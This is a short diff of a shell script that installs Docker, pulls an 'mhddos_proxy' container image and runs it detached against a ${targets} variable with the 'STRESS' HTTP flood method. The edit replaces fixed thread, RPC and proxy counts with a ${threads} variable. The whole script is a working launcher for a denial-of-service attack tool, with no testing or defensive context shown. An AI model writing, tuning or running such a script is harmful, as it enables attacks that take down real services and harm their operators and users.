@@ -5,5 +5,5 @@ apt-get install -y docker.io
 
 docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
 
-docker run -d -it ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest ${targets} -t 1500 --rpc 1000 -p 1000 \
+docker run -d -it ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest ${targets} -t ${threads} \
     --http-methods STRESS --debug
